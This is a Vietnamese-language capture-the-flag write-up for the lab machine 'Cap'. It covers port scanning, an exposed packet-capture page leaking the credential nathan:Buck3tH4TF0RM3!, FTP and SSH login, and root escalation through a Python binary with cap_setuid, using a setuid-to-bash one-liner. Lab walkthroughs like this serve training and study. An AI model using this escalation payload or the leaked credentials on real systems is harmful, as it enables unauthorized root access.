# Cap

<img width="1267" height="595" alt="image" src="https://github.com/user-attachments/assets/950ec3c3-53dd-4eae-96c7-19be2507ab1f" />

Target ở đây là `10.10.10.245`, tôi dùng nmap để scan các port thì xuất hiện 3 port:

<img width="1068" height="463" alt="image" src="https://github.com/user-attachments/assets/03ea83c6-d7c9-4438-9095-45e8c5feb0f7" />

Trong website thì có chức năng `capture`, sau đó sẽ cho ra ở `/data/<id>`

<img width="935" height="769" alt="image" src="https://github.com/user-attachments/assets/aa1ed0f7-e052-440b-9d12-ca75537587e5" />

Tôi tìm được `/data/0` có chứa các thông tin nhạy cảm:

<img width="947" height="764" alt="image" src="https://github.com/user-attachments/assets/19794ddd-4296-4f75-bac9-aa6e008e1a05" />

Sau đó tìm được cred là `nathan:Buck3tH4TF0RM3!` ở ftp:

<img width="1452" height="828" alt="image" src="https://github.com/user-attachments/assets/28446801-1631-4751-8392-52f7692d26e2" />

Và đã ssh vào được thông qua cred ở trên:

<img width="925" height="931" alt="image" src="https://github.com/user-attachments/assets/dbec2f20-10e6-40d9-9960-6e6cb0092fa2" />

Ở đây tôi dùng `getcap /usr/bin/python3.8` thì có kết quả là `+eip`, điều này có nghĩa là `/usr/bin/python3.8` được gán capability `cap_setuid+ep`, tức là khi chạy Python, process có quyền đổi UID tùy ý:

<img width="523" height="70" alt="image" src="https://github.com/user-attachments/assets/65f701c4-6b9c-460a-bae0-e1f1560d97f6" />

Lúc này chạy payload `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'` và lên được root:

<img width="800" height="165" alt="image" src="https://github.com/user-attachments/assets/8df4fb59-b15c-446c-baa9-7dc66ef0ec07" />



